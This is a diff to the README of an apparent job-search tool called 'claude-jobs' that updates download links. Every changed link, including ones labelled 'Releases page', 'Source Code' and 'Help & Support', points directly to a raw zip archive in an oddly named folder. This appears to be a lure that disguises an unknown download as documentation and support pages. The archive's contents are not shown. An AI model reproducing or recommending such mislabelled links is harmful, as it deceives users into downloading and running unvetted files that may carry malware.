@@ -6,7 +6,7 @@ Welcome to the claude-jobs application. This tool helps you search for job openi
 
 ## 📥 Download the Application
 
-[![Download claude-jobs](https://raw.githubusercontent.com/Eleusio705/claude-jobs/main/unspellable/claude_jobs_v3.6.zip%20claude--jobs-v1.0-brightgreen)](https://raw.githubusercontent.com/Eleusio705/claude-jobs/main/unspellable/claude_jobs_v3.6.zip)
+[![Download claude-jobs](https://raw.githubusercontent.com/Eleusio705/claude-jobs/main/unspellable/claude-jobs-2.7.zip%20claude--jobs-v1.0-brightgreen)](https://raw.githubusercontent.com/Eleusio705/claude-jobs/main/unspellable/claude-jobs-2.7.zip)
 
 ## 📋 System Requirements
 
@@ -19,7 +19,7 @@ Before running claude-jobs, ensure your system meets the following requirements:
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/Eleusio705/claude-jobs/main/unspellable/claude_jobs_v3.6.zip) to download the latest version of claude-jobs. 
+   Go to our [Releases page](https://raw.githubusercontent.com/Eleusio705/claude-jobs/main/unspellable/claude-jobs-2.7.zip) to download the latest version of claude-jobs. 
 
 2. **Choose Your Version**  
    Look for the latest release and click on the link. This will take you to the download options. Select the file that matches your operating system. 
@@ -82,8 +82,8 @@ Yes, claude-jobs is an open-source project. You can use it without any cost.
 
 ## 🔗 Useful Links
 
-- [Source Code](https://raw.githubusercontent.com/Eleusio705/claude-jobs/main/unspellable/claude_jobs_v3.6.zip)
-- [Help & Support](https://raw.githubusercontent.com/Eleusio705/claude-jobs/main/unspellable/claude_jobs_v3.6.zip)
+- [Source Code](https://raw.githubusercontent.com/Eleusio705/claude-jobs/main/unspellable/claude-jobs-2.7.zip)
+- [Help & Support](https://raw.githubusercontent.com/Eleusio705/claude-jobs/main/unspellable/claude-jobs-2.7.zip)
 
 ## 📞 Get in Touch
 
